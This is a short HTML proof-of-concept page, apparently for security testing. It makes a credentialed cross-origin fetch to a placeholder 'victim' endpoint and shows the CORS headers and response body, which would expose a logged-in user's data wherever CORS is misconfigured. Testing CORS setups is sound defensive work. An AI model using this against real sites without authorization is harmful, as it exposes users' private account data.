<!doctype html>
<html>
  <body>
    <h2>CORS Read Test</h2>
    <button id="go">Fetch</button>
    <pre id="out"></pre>

    <script>
      // Replace with the API endpoint you are authorized to test
      const TARGET = "https://victim.example.com/rest/user/whoami";

      document.getElementById("go").onclick = async () => {
        const out = document.getElementById("out");
        out.textContent = "Fetchingâ€¦";

        try {
          const res = await fetch(TARGET, {
            method: "GET",
            // IMPORTANT:
            // If the endpoint relies on cookies, you need credentials: "include"
            // If it uses Authorization: Bearer, the browser won't magically add it.
            credentials: "include"
          });

          out.textContent =
            "Status: " + res.status + "\n" +
            "ACAO: " + res.headers.get("access-control-allow-origin") + "\n" +
            "ACAC: " + res.headers.get("access-control-allow-credentials") + "\n\n";

          const text = await res.text();
          out.textContent += text;
        } catch (e) {
          out.textContent = "Blocked / Error:\n" + e;
        }
      };
    </script>
  </body>
</html>
